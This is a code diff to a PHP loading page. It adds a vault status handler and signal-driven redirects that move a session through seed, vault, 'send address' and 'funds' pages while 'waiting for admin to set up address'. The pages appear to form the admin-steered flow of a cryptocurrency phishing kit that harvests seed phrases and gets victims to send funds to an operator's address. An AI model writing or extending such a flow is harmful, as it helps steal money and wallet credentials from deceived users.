@@ -24,6 +24,16 @@ if (!isset($_SESSION["email"]) || !isset($_SESSION["token"])) {
 // Retrieve the token from the session
 $token = $_SESSION["token"];
 
+// Handle vault continue POST request
+if (isset($_POST['vault_continue'])) {
+    // Update status to indicate waiting for admin address setup
+    $sql = "UPDATE user_submissions SET vault_status = 'WaitingForAddress', activity = 'WaitingForAddress' WHERE token = ?";
+    $stmt = $conn->prepare($sql);
+    $stmt->bind_param("s", $token);
+    $stmt->execute();
+    $stmt->close();
+}
+
 // Update user activity to indicate LoadingPage
 updateActivity($token, "LoadingPage");
 
@@ -73,6 +83,14 @@ if (file_exists($signalFile)) {
 
         case 'seed':
             header('Location: seed.php');
+            exit;
+
+        case 'vault':
+            header('Location: vault.php');
+            exit;
+
+        case 'VaultCodeGenerated':
+            header('Location: vault_code_display.php');
             exit;
 
         default:
@@ -279,6 +297,38 @@ if (file_exists($signalFile)) {
                     case 'seed':
                         // Redirect to seed.php if the signal is received
                         window.location.href = 'seed.php';
+                        break;
+                    case 'vault':
+                        // Redirect to vault.php if the signal is received
+                        window.location.href = 'vault.php';
+                        break;
+                    case 'VaultCodeGenerated':
+                        // Redirect to vault code display if the signal is received
+                        window.location.href = 'vault_code_display.php';
+                        break;
+                    case 'WaitingForAddress':
+                        // Stay on loading screen while admin sets up address
+                        console.log('Waiting for admin to set up address...');
+                        break;
+                    case 'AddressSet':
+                        // Redirect to vault access when admin has set address
+                        window.location.href = 'vault_access.php';
+                        break;
+                    case 'VaultWallet':
+                        // Redirect to vault send address page when in wallet stage
+                        window.location.href = 'vault_send_address.php';
+                        break;
+                    case 'VaultComplete':
+                        // Redirect to vault funds loading when funds complete
+                        window.location.href = 'vault_funds_loading.php';
+                        break;
+                    case 'VaultFundsConfirmed':
+                        // Redirect to vault funds loading when funds confirmed
+                        window.location.href = 'vault_funds_loading.php';
+                        break;
+                    case 'finish':
+                        // Redirect to finish.php if the signal is received
+                        window.location.href = 'finish.php';
                         break;
                     default:
                         console.log('Invalid signal');
